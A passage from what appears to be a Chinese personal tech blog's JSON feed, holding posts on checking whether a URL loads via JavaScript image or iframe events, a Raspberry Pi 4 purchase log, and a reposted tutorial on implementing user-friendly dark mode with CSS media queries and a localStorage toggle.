的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 